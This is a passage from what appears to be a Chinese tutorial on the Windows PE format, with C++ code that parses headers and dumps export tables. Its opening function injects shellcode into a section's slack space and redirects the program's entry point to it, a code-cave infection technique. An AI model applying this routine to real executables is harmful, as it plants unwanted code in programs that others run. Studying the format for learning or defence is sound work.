pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pFileBuffer --&gt; 文件缓冲区失败&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer --&gt; 内存缓冲区失败&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pSectionHeader-&gt;SizeOfRawData - pSectionHeader-&gt;Misc.VirtualSize &lt; ShellCodeLength)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;代码区空闲空间不足...&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="built_in">free</span>(pImageBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//BYTE* CODEBEGIN = (BYTE*)((DWORD)pDosHeader + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)</span></span><br><span class="line">	BYTE *codeBegin = (BYTE *)((DWORD)pImageBuffer + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize); <span class="comment">// 计算放到哪里 </span></span><br><span class="line">	<span class="built_in">memcpy</span>(codeBegin, ShellCode, ShellCodeLength); </span><br><span class="line">	<span class="comment">//MessageBoxA_Addr = E8指令的下一条地址 + X</span></span><br><span class="line">	<span class="comment">//由于messageBoxAddr是虚拟内存中的值，故需要将callAddr转换成相应的可执行的虚拟地址</span></span><br><span class="line">	DWORD test = (DWORD)pImageBuffer;</span><br><span class="line">	DWORD Codee = (DWORD)codeBegin;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer：%x\n&quot;</span>,test);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;codeBegin：%x\n&quot;</span>,Codee);</span><br><span class="line">	DWORD callAddr_X = MessageBoxA_Addr - ((DWORD)codeBegin + <span class="number">0xD</span> - (DWORD)pImageBuffer + pOptionHeader-&gt;ImageBase); <span class="comment">//从ImageBuffer 到 ImageBase 的过程</span></span><br><span class="line">	*(PDWORD)(codeBegin + <span class="number">0x09</span>) = callAddr_X;</span><br><span class="line">	cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;callAddr_X = &quot;</span> &lt;&lt; callAddr_X &lt;&lt; endl;</span><br><span class="line">	DWORD jmpAddr_Y = (pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint) - ((DWORD)codeBegin + ShellCodeLength - (DWORD)pImageBuffer + pOptionHeader-&gt;ImageBase);</span><br><span class="line">	<span class="comment">//DWORD jmpAddr = pOptionHeader-&gt;AddressOfEntryPoint - ((DWORD)codeBegin  - (DWORD)pImageBuffer + shellCodeLength);</span></span><br><span class="line">	cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;jmpAddr_Y = &quot;</span> &lt;&lt; jmpAddr_Y &lt;&lt; endl;</span><br><span class="line">	*(PDWORD)(codeBegin + <span class="number">0x0E</span>) = jmpAddr_Y;</span><br><span class="line"> 	<span class="comment">//OEP是一个偏移值</span></span><br><span class="line">	pOptionHeader-&gt;AddressOfEntryPoint = (DWORD)codeBegin - (DWORD)pImageBuffer ;</span><br><span class="line"> </span><br><span class="line">	size = <span class="built_in">CopyImageBufferToNewFileBuffer</span>(pImageBuffer, &amp;pNewFileBuffer);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sizeofimage：%x\n&quot;</span>,size);</span><br><span class="line">	<span class="built_in">NewFileBufferToFile</span>(pNewFileBuffer, size, FilePath_Out);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="A-Is-64BitOS"><a href="#A-Is-64BitOS" class="headerlink" title="A Is_64BitOS"></a>A Is_64BitOS</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">判断PE文件是否是64位，IA64（Intel）/x86_64（AMD）/ALPHA64</span></span><br><span class="line"><span class="comment">该出现PE时没出现，就可能是32位，但是检测到machine的数值，就能确定。</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> IMAGE_FILE_MACHINE_AMD64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64   0x8664 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">Is_64BitOS</span><span class="params">( IN LPSTR lpszFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID pTempBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pTempBuffer = <span class="built_in">ReadPEFile</span>(lpszFile);</span><br><span class="line"> 	pDosHeader = (PIMAGE_DOS_HEADER)pTempBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pTempBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;机器码为:&quot;</span> &lt;&lt; pNTHeader-&gt;FileHeader.Machine &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span>(pNTHeader-&gt;Signature != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;PE文件版本可能为64位&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (pNTHeader-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_IA64 || pNTHeader-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 || </span><br><span class="line">		pNTHeader-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_ALPHA64)&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;PE文件版本为64位&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;PE文件版本为32位&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="B-ReturnAllExport"><a href="#B-ReturnAllExport" class="headerlink" title="B ReturnAllExport"></a>B ReturnAllExport</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************	</span></span><br><span class="line"><span class="comment">输出导出表完整信息</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">VOID <span class="title">ReturnAllExport</span><span class="params">( IN LPVOID pFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL Is_64Bit = <span class="built_in">Is_64BitOS</span>(FILEPATH);</span><br><span class="line">  <span class="keyword">if</span>(Is_64Bit)&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS64 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER64 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">    pNTHeader = (PIMAGE_NT_HEADERS64)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">    pOptionHeader = (PIMAGE_OPTIONAL_HEADER64)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    PIMAGE_OPTIONAL_HEADER64 pOptionHeader_1 = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line"><span class="comment">    printf(&quot;pOptionHeader：%x\n&quot;,(DWORD)pOptionHeader);</span></span><br><span class="line"><span class="comment">    printf(&quot;pOptionHeader_1：%x\n&quot;,(DWORD)pOptionHeader_1);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">    pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">    <span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">    DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">    <span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">    <span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i, j;</span><br><span class="line">		<span class="comment">//导出函数的序号 = AddressOfNameOrdinals中的值 + Base</span></span><br><span class="line">		<span class="comment">//Base = 导出函数的序号最小值</span></span><br><span class="line">		<span class="comment">//AddressOfNameOrdinals中的值 = AddressOfFunctions下标</span></span><br><span class="line">		<span class="comment">//i为地址表下标，j为序号表的下标（AddrOrdinals[j]值为地址表下标）</span></span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++)&#123;</span><br><span class="line">			<span class="comment">//先检索函数地址表，因为所有的函数地址都在里面，包括用序号导出的和用函数名导出的。然后拿着某个函数的下标再到AddrOrdinals去检索，若匹配不到，说明该函数不</span></span><br><span class="line">			<span class="comment">//是以函数名导出的。</span></span><br><span class="line">			<span class="comment">//地址表中可能存在无用的值（就是为0的值）</span></span><br><span class="line">			<span class="keyword">if</span>(AddrFunctions[i] == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)&#123;</span><br><span class="line">				<span class="comment">//判断是否在序号表中</span></span><br><span class="line">				<span class="comment">//printf(&quot;函数名文件偏移：%x\n&quot;,RVAToFOA(AddrName[j], pFileBuffer));该地址为字符串起始地址</span></span><br><span class="line">				<span class="keyword">if</span>(AddrOrdinals[j] == i)&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i], <span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(j != pExportDirectory-&gt;NumberOfNames)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i],<span class="string">&quot;------NONAME函数------&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">		<span class="comment">//pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + sizeof(DWORD)); </span></span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="comment">//printf(&quot;%s&quot;,FOA + (DWORD)pFileBuffer) 等给于PDWORD TEST = (PDWORD)(FOA+ (DWORD)pFileBuffer);printf(&quot;%s&quot;,TEST) </span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		PDWORD TEST = (PDWORD)((RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer)+ (DWORD)pFileBuffer));</span></span><br><span class="line"><span class="comment">		printf(&quot;%s\n&quot;,TEST) ;</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i, j;</span><br><span class="line">		<span class="comment">//导出函数的序号 = AddressOfNameOrdinals中的值 + Base</span></span><br><span class="line">		<span class="comment">//Base = 导出函数的序号最小值</span></span><br><span class="line">		<span class="comment">//AddressOfNameOrdinals中的值 = AddressOfFunctions下标</span></span><br><span class="line">		<span class="comment">//i为地址表下标，j为序号表的下标（AddrOrdinals[j]值为地址表下标）</span></span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++)&#123;</span><br><span class="line">			<span class="comment">//地址表中可能存在无用的值（就是为0的值）</span></span><br><span class="line">			<span class="keyword">if</span>(AddrFunctions[i] == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)&#123;</span><br><span class="line">				<span class="comment">//判断是否在序号表中</span></span><br><span class="line">				<span class="comment">//printf(&quot;函数名文件偏移：%x\n&quot;,RVAToFOA(AddrName[j], pFileBuffer));</span></span><br><span class="line">				<span class="keyword">if</span>(AddrOrdinals[j] == i)&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i], <span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(j != pExportDirectory-&gt;NumberOfNames)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i],<span class="string">&quot;------NONAME函数------&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="C-GetFunctionAddrByOrdinals"><a href="#C-GetFunctionAddrByOrdinals" class="headerlink" title="C GetFunctionAddrByOrdinals"></a>C GetFunctionAddrByOrdinals</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">根据导出函数序号，得到导出函数RVA</span></span><br><span class="line"><span class="comment">参数：该文件的FileBuffer，导出函数的序号</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test 0</span></span><br><span class="line"><span class="function">PDWORD <span class="title">GetFunctionAddrByOrdinals</span><span class="params">(PVOID pFileBuffer, DWORD Ordinal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL Is_64Bit = <span class="built_in">Is_64BitOS</span>(FILEPATH);</span><br><span class="line">	<span class="keyword">if</span>(Is_64Bit)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS64 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER64 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY 